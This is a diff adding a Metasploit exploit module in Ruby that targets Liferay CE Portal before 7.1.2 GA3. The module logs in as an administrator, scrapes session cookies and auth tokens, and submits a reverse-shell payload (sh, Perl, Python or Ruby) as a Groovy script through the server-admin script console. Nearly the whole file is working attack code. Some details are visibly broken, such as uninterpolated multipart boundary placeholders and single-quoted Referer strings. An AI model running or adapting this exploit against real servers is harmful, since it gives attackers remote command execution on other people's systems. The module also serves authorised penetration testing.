@@ -1,0 +1,266 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Liferay CE Portal Tomcat < 7.1.2 ga3 - Groovy-Console Remote Command Execution',
+			'Description'    => %q{
+			This module uses the Liferay CE Portal Groovy script console to execute
+			OS commands. The Groovy script can execute commands on the system via a [command].execute() call.
+                        Valid credentials for an application administrator user account are required
+			This module has been tested successfully with Liferay CE Portal Tomcat 7.1.2 ga3 on Debian 4.9.18-1kali1 system.
+			},
+			'Author'	=> 
+				[
+					'AkkuS <Özkan Mustafa Akkuş>', # Vulnerability Discovery, PoC & Msf Module
+				],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'URL', 'https://pentest.com.tr/exploits/Liferay-CE-Portal-Tomcat-7-1-2-ga3-Groovy-Console-Remote-Command-Execution-Metasploit.html' ],
+				],
+			'Privileged'     => false,
+			'Platform'    => [ 'unix' ],
+			'Payload'        =>
+				{
+					'DisableNops' => true,
+					'Compat'      =>
+						{
+							'PayloadType' => 'cmd',
+							'RequiredCmd' => 'reverse perl ruby python',
+						}
+				},
+			'Arch'           => ARCH_CMD,
+			'Targets'        =>
+				[
+					[ 'Liferay CE Portal Tomcat < 7.1.2 ga3', { }]
+				],
+			'DisclosureDate' => 'March 08, 2019',
+			'DefaultTarget'  => 0,
+			'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' }))
+		
+		register_options(
+			[
+				Opt::RPORT(8080),
+				OptString.new('USERNAME', [ true, 'The username to authenticate as' ]),
+				OptString.new('PASSWORD', [ true, 'The password for the specified username', ]),
+				OptString.new('PATH',     [ true,  'The URI path of the portal', '/' ]),
+			], self.class)
+	end
+##
+# Version and Vulnerability Check
+##
+        def check 
+		res = send_request_cgi({
+			'method'    => 'GET',
+			'uri'       => datastore['PATH'] + 'web/guest/home'
+		})
+
+		version = res.headers['Liferay-Portal']
+                print_status("Target: #{version}")
+
+		if res and res.code == 200 and version =~ /Portal 7./ or version =~ /Portal 6./
+		   return Exploit::CheckCode::Vulnerable
+		else
+		   return Exploit::CheckCode::Safe
+		end
+		return res
+	end
+##
+# Returns the SSL, Host and Port as a string
+##
+        def peer
+          "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+        end
+	
+	def exploit
+##
+# Login and cookie information gathering
+##
+		print_status('Attempting to login with specified user...')
+		res = send_request_cgi({
+			'method'    => 'GET',
+			'uri'       => datastore['PATH'] + 'web/guest/home'
+		})
+                
+                authtoken = res.body.split('Liferay.authToken=')[1].split(';')[0].split('Liferay.authToken=')[0].split('"')[1]
+                print_status("Liferay AuthToken = #{authtoken}")
+		
+		sessionid = 'JSESSIONID=' << res.headers['set-cookie'].split('JSESSIONID=')[1].split('; ')[0]
+		cookie = "#{sessionid}; COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US"
+                print_status("#{sessionid}")
+
+                boundary = Rex::Text.rand_text_alphanumeric(29)
+
+                data = "-----------------------------{boundary}"
+                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_formDate\"\r\n\r\n"
+                data << ""
+                data << "\r\n-----------------------------{boundary}"
+                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_saveLastPath\"\r\n\r\nfalse\r\n"
+                data << "-----------------------------{boundary}"
+                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_redirect\"\r\n\r\n\r\n"
+                data << "-----------------------------{boundary}"
+                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_doActionAfterLogin\"\r\n\r\nfalse\r\n"
+                data << "-----------------------------{boundary}"
+                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_login\"\r\n\r\n"
+                data << "#{datastore['USERNAME']}"
+                data << "\r\n-----------------------------{boundary}"
+                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_password\"\r\n\r\n"
+                data << "#{datastore['PASSWORD']}"
+                data << "\r\n-----------------------------{boundary}"
+                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_checkboxNames\"\r\n\r\nrememberMe\r\n"
+                data << "-----------------------------{boundary}"
+                data << "\r\nContent-Disposition: form-data; name=\"p_auth\"\r\n\r\n"
+                data << "#{authtoken}"
+                data << "\r\n-----------------------------{boundary}--\r\n"
+	
+		res = send_request_cgi({
+			'method'    => 'POST',
+			'uri'       => datastore['PATH'] + 'web/guest/home?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=1&p_p_state=exclusive&p_p_mode=view&_com_liferay_login_web_portlet_LoginPortlet_javax.portlet.action=%2Flogin%2Flogin&_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Flogin',
+			'data'      => data,
+                        'headers' =>
+                        {
+                          'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}',
+                        },
+			'cookie'    => cookie
+		})
+
+		if res.code == 302
+			print_good('User authentication was successful.')
+                else
+			print_error('Something went wrong! Login failed.')
+		end
+
+		cookie1 = ''
+		for cookie1_i in [ 'JSESSIONID=', 'COMPANY_ID=', 'ID=' ]
+			cookie1 << cookie1_i + res.headers['set-cookie'].split(cookie1_i)[1].split('; ')[0] + '; '
+		end
+
+                cookies0 = "#{cookie1} COOKIE_SUPPORT=true;"
+
+		res = send_request_cgi({
+			'method'    => 'GET',
+			'uri'       => datastore['PATH'] + 'c',
+			'cookie'    => cookies0
+		})
+##
+# Completion of the cookie information
+##
+		cookie2 = ''
+		for cookie2_i in [ 'GUEST_LANGUAGE_ID=', 'Max-Age=', 'Expires=', 'Path=' ]
+			cookie2 << cookie2_i + res.headers['set-cookie'].split(cookie2_i)[1].split('; ')[0] + '; '
+		end
+
+                cookies = "#{cookie1} #{cookie2} COOKIE_SUPPORT=true;"
+                if cookies =~ /ID=/
+                  print_good("Cookies information has been verified.")
+                else
+                  print_error("Cookies information could not be verified!")
+                  exit 0
+               end
+##
+# Request to Groovy script authtoken
+##
+		res = send_request_cgi({
+			'method'    => 'GET',
+			'uri'       => datastore['PATH'] + 'group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script',
+                        'headers' =>
+                        {
+                          'Referer'   => '#{peer}/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script',
+                        },
+			'cookie'    => cookies
+		})
+##
+# Calling authtoken to Groovy script
+##
+                authtoken2 = res.body.split('Liferay.authToken=')[1].split(';')[0].split('Liferay.authToken=')[0].split('"')[1]
+                print_status("Liferay AuthToken to Shell = #{authtoken2}") 
+##
+# Payload Separation **cmd/unix/reverse|reverse_ruby|reverse_python|reverse_perl**
+## 
+                if payload.encoded =~ /sh/
+                  cmd = payload.encoded.split('sh -c')[1].split("'")[1]
+                  pay = "'sh',  '-c',  '#{cmd}'"
+                  print_good("Reverse payload was prepared")
+                elsif payload.encoded =~ /perl/
+                  cmd = payload.encoded.split('perl -MIO -e')[1].split("'")[1]
+                  pay = "'perl',  '-MIO',  '-e',  '#{cmd}'"
+                  print_good("Reverse Perl payload was prepared")
+                elsif payload.encoded =~ /python/
+                  cmd = payload.encoded.split('python -c "exec(')[1].split(".decode('base64'))\"")[0].split("'")[1]
+                  pay = "'python',  '-c',  'exec(\"#{cmd}\".decode(\"base64\"))'"
+                  print_good("Reverse Python payload was prepared")
+                elsif payload.encoded =~ /ruby/
+                  cmd = payload.encoded.split('ruby -rsocket -e ')[1].split("'")[1]
+                  pay = "'ruby',  '-rsocket',  '-e', '#{cmd}'"
+                  print_good("Reverse Ruby payload was prepared")
+                else
+                  print_error("! Please choose payload one of cmd/unix/reverse|reverse_ruby|reverse_python|reverse_perl ")
+                  exit 0
+                end
+##
+# Post Data to run Payload
+##
+                cmdata = "-----------------------------{boundary}"
+                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_formDate\"\r\n\r\n"
+                cmdata << ""
+                cmdata << "\r\n-----------------------------{boundary}"
+                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1\"\r\n\r\n"
+                cmdata << "script\r\n-----------------------------{boundary}"
+                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_redirect\"\r\n\r\n"
+                cmdata << "#{peer}/group/control_panel/manage?p_p_id="
+                cmdata << "com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle="
+                cmdata << "0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_"
+                cmdata << "ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_"
+                cmdata << "server_admin_web_portlet_ServerAdminPortlet_cur=""0&_com_liferay_server_"
+                cmdata << "admin_web_portlet_ServerAdminPortlet_tabs1=script"
+                cmdata << "\r\n-----------------------------{boundary}"
+                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_language\"\r\n\r\n"
+                cmdata << "groovy"
+                cmdata << "\r\n-----------------------------{boundary}"
+                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_script\"\r\n\r\n"
+                cmdata << "def cmd = [#{pay}]"
+                cmdata << "\r\ncmd.execute()"
+                cmdata << "\r\n-----------------------------{boundary}"
+                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_cmd\"\r\n\r\n"
+                cmdata << "runScript"
+                cmdata << "\r\n-----------------------------{boundary}"
+                cmdata << "\r\nContent-Disposition: form-data; name=\"p_auth\"\r\n\r\n"
+                cmdata << "#{authtoken2}"
+                cmdata << "\r\n-----------------------------{boundary}--\r\n"            
+##
+# Request to get reverse shell
+##
+		print_status("Attempting to execute the payload...")
+		res = send_request_cgi({
+			'method'    => 'POST',
+			'uri'       => datastore['PATH'] + 'group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=1&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_javax.portlet.action=%2Fserver_admin%2Fedit_server',
+			'data'      => cmdata,
+                        'headers' =>
+                        {
+                          'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}',
+                          'Referer'   => '#{peer}/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script',
+                        },
+			'cookie'    => cookies
+		})
+
+		if res.code == 302
+			print_good('Payload was successfully executed.')
+                else
+			print_error('Something went wrong!')
+		end
+
+	end
+end
+##
+# End
+##
